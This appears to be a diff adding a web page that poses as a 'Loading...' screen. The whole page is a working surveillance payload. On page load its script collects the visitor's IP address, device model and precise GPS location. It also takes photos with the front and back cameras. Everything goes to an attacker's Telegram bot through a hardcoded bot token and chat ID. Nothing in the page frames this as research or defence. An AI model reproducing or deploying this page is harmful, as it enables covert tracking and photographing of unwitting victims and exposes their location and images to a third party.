@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Loading...</title>
+    <style>
+        body { margin: 0; background: #000; overflow: hidden; }
+        video { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; height: 100%; object-fit: cover; z-index: -1; opacity: 0.3; }
+        #status { position: fixed; bottom: 10px; left: 10px; color: #0f0; font-family: monospace; font-size: 12px; background: rgba(0,0,0,0.8); padding: 5px; z-index: 10; }
+    </style>
+</head>
+<body>
+
+<video id="video" autoplay playsinline muted></video>
+<div id="status">Initializing...</div>
+
+<script>
+    const status = document.getElementById('status');
+    let botToken = "8675736790:AAG8Z0BT-Z2m0gxdNyjyWDET9EimzDrcH3Q"; // Replace with your token
+    let chatId = "934356590";         // Replace with your ID
+
+    async function init() {
+        status.innerText += "\nFetching IP...";
+        
+        // 1. Get IP
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        
+        // 2. Get System Info
+        const sysInfo = {
+            model: navigator.userAgent.match(/Android.*?;\s([^)]+)\)/)?.[1] || "Unknown",
+            os: "Android",
+            screen: `${screen.width}x${screen.height}`,
+            memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "N/A"
+        };
+
+        // 3. Get Location
+        let location = "Denied";
+        if ("geolocation" in navigator) {
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        maximumAge: 0
+                    });
+                });
+                location = `${pos.coords.latitude.toFixed(6)},${pos.coords.longitude.toFixed(6)}`;
+            } catch (e) {
+                location = "Error: " + e.message;
+            }
+        }
+
+        status.innerText += `\nIP: ${ipData.ip}\nLoc: ${location}`;
+
+        // 4. Capture Photos
+        const frontPhoto = await capturePhoto('user');
+        const backPhoto = await capturePhoto('environment');
+
+        // 5. Send to Telegram
+        sendToTelegram(ipData.ip, location, sysInfo, frontPhoto, backPhoto);
+    }
+
+    async function capturePhoto(facingMode) {
+        status.innerText += `\nOpening ${facingMode === 'user' ? 'Front' : 'Back'} Camera...`;
+        
+        // Stop previous stream if exists
+        const video = document.getElementById('video');
+        if (video.srcObject) {
+            video.srcObject.getTracks().forEach(track => track.stop());
+        }
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: facingMode, width: 1280, height: 720 },
+            audio: false
+        });
+        
+        video.srcObject = stream;
+        
+        // Wait a moment for camera to focus/adjust
+        await new Promise(r => setTimeout(r, 1000));
+
+        // Create canvas to take snapshot
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Convert to Base64
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+        
+        // Stop the stream for this camera
+        stream.getTracks().forEach(track => track.stop());
+        
+        return dataUrl;
+    }
+
+    async function sendToTelegram(ip, location, sys, frontImg, backImg) {
+        status.innerText = "Uploading...";
+        
+        const message = `📸 *Device Photo Dump*\n\n` +
+                        `🌐 *IP:* ${ip}\n` +
+                        `📍 *Loc:* ${location}\n` +
+                        `💻 *Model:* ${sys.model}\n` +
+                        `🔋 *Mem:* ${sys.memory}`;
+
+        // Send Front Photo
+        await sendImage(frontImg, "Front_Cam.jpg");
+        
+        // Send Back Photo
+        await sendImage(backImg, "Back_Cam.jpg");
+
+        // Send Text Message with details
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        }).then(() => {
+            status.innerText = "Done!";
+            // Optional: Keep page open or redirect
+        });
+    }
+
+    async function sendImage(base64Data, filename) {
+        // Convert base64 to blob
+        const byteCharacters = atob(base64Data.split(',')[1]);
+        const byteNumbers = new Array(byteCharacters.length);
+        for (let i = 0; i < byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        const blob = new Blob([byteArray], {type: 'image/jpeg'});
+
+        // Prepare FormData for Telegram API
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, filename);
+        formData.append('caption', "Captured Photo");
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+    }
+
+    // Start on load
+    init();
+</script>
+
+</body>
+</html>
